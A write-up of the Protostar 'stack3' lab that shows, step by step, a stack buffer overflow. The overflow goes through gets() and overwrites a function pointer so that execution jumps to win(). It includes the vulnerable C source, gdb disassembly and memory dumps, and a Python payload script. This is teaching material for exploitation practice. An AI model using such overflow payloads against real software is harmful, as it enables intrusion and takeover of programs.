## STACK THREE ##
Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hints

both gdb and objdump is your friend you determining where the win() function lies in memory.
This level is at /opt/protostar/bin/stack3

### Source Code ###
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
After disassemble the code, the variables can be interpreted as below
```
0x08048438 <main+0>:    push   %ebp
0x08048439 <main+1>:    mov    %esp,%ebp
0x0804843b <main+3>:    and    $0xfffffff0,%esp
0x0804843e <main+6>:    sub    $0x60,%esp            <- 96 bytes for stack
0x08048441 <main+9>:    movl   $0x0,0x5c(%esp)       <- fp address at 0x5c(%esp)
0x08048449 <main+17>:   lea    0x1c(%esp),%eax
0x0804844d <main+21>:   mov    %eax,(%esp)
0x08048450 <main+24>:   call   0x8048330 <gets@plt>  <- where to exploit
0x08048455 <main+29>:   cmpl   $0x0,0x5c(%esp)
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    $0x8048560,%eax
0x08048461 <main+41>:   mov    0x5c(%esp),%edx
0x08048465 <main+45>:   mov    %edx,0x4(%esp)
0x08048469 <main+49>:   mov    %eax,(%esp)
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    0x5c(%esp),%eax
0x08048475 <main+61>:   call   *%eax
0x08048477 <main+63>:   leave  
0x08048478 <main+64>:   ret 
```

The address of win() function can be found by objdump
```
objdump -t stack3 | grep win
08048424 g     F .text  00000014              win
```
We need to overflow the buffer and insert this address

The following lines show registers and stacks before gets
```
eax            0xbffff75c       -1073744036
ecx            0x84ce3cec       -2066858772
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff740       0xbffff740
ebp            0xbffff7a8       0xbffff7a8
esi            0x0      0
edi            0x0      0
eip            0x8048450        0x8048450 <main+24>
eflags         0x200282 [ SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      0xb7eada75
0xbffff760:     0xb7fd7ff4      0x0804967c      0xbffff778      0x0804830c
0xbffff770:     0xb7ff1040      0x0804967c      0xbffff7a8      0x080484a9
0xbffff780:     0xb7fd8304      0xb7fd7ff4      0x08048490      0xbffff7a8
0xbffff790:     0xb7ec6365      0xb7ff1040      0x0804849b      0x00000000 <- fp
---Type <return> to continue, or q <return> to quit---
0x8048450 <main+24>:    call   0x8048330 <gets@plt>
0x8048455 <main+29>:    cmpl   $0x0,0x5c(%esp)

```

Therefore, we need to prepare a script *input.pyt* to easily insert the non-ascii character
from the win() function address.

```python
buffer = "AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDD"
win_addr = '\x24\x84\x04\x08'    # little endian
send_data = buffer + win_addr
print(send_data)
```

Run the script and redirect it to a file
```bash 
python input.pyt > input.txt
```

Let's run again

```
gdb stack3 
r < input.txt
```
the string dcba at the end means 0x61626364 in ascii and in little endian order 

```
eax            0xbffff75c       -1073744036                                                             
ecx            0xbffff75c       -1073744036                                                             
edx            0xb7fd9334       -1208118476                                                             
ebx            0xb7fd7ff4       -1208123404                                                             
esp            0xbffff740       0xbffff740                                                              
ebp            0xbffff7a8       0xbffff7a8                                                              
esi            0x0      0                                                                               
edi            0x0      0                                                                               
eip            0x8048455        0x8048455 <main+29>                                                     
eflags         0x200246 [ PF ZF IF ID ]                                                                 
cs             0x73     115                                                                             
ss             0x7b     123                                                                             
ds             0x7b     123                                                                             
es             0x7b     123                                                                             
fs             0x0      0                                                                               
gs             0x33     51                                                                              
0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e                              
0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      0x41414141                              
0xbffff760:     0x41414141      0x41414141      0x41414141      0x42424242                              
0xbffff770:     0x42424242      0x42424242      0x42424242      0x43434343
0xbffff780:     0x43434343      0x43434343      0x43434343      0x44444444
0xbffff790:     0x44444444      0x44444444      0x44444444      0x08048424 <- it changed to win() address

```

and the result
```
calling function pointer, jumping to 0x08048424
code flow successfully changed

```










